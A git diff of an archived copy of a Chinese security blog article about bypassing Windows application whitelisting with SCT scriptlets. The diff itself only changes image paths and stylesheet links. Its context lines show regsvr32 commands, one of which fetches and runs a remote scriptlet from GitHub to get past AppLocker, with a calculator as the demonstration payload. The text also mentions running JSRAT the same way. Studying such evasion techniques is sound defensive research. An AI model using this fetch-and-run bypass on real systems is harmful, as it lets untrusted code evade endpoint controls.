@@ -3,7 +3,7 @@
 			<head>
 			     <title>Use SCT to Bypass Application Whitelisting Protection - 三好学生</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/15124">http://drops.wooyun.org/tips/15124</a></h1>
 				
@@ -14,7 +14,7 @@
 
 <p>最近Casey <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="81d2ece8f5e9c1f2f4e3d5e4e4640907653b2a653b0765390165392b64243c660f2864053e661b05670b01643626">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>，利用sct文件来实现的持久机制。 我对此也很感兴趣,于是对相关的内容作了研究学习，在学习过程中Casey Smith又教会了我很多，学会了一个绕过应用程序白名单的技巧，所以在此将学到的知识整理一下。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160422/201604220237057896401.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/201604220237057896401.png" alt="enter image description here"></p>
 
 <!--more-->
 
@@ -112,11 +112,11 @@ end function
 <pre><code>regsvr32 /i:"Component.sct" scrobj.dll
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160422/20160422023708288612-13.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/20160422023708288612-13.png" alt="enter image description here"></p>
 
 <p>如图，注册后在注册表<code>HKEY_CLASSES_ROOT\CLSID\</code>下同步创建键值<code>{10001111-0000-0000-0000-000000000001}</code></p>
 
-<p><img src="http://static.wooyun.org//drops/20160422/20160422023709267252-22.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/20160422023709267252-22.png" alt="enter image description here"></p>
 
 <p>注册表键值细节如下：</p>
 
@@ -148,7 +148,7 @@ MsgBox ref.Sum(4, 6)
 
 <p>执行后如图，成功调用COM组件</p>
 
-<p><img src="http://static.wooyun.org//drops/20160422/20160422023711338292-32.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/20160422023711338292-32.png" alt="enter image description here"></p>
 
 <h3>4、补充</h3>
 
@@ -409,7 +409,7 @@ x.Exec();
 <pre><code>regsvr32 /i https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160422/20160422023714835792-41.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/20160422023714835792-41.png" alt="enter image description here"></p>
 
 <p>如图虽然能够成功弹出计算器，但是会弹框提示报错</p>
 
@@ -464,7 +464,7 @@ var c=ref.Exec();
 
 <p>如图，普通用户权限，开启Windows AppLocker，成功执行js代码，弹出计算器，前面介绍的JSRAT的应用方法也可以用这种方式执行</p>
 
-<p><img src="http://static.wooyun.org//drops/20160422/20160422023717694262-51.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/20160422023717694262-51.png" alt="enter image description here"></p>
 
 <h1>0x06 补充</h1>
 
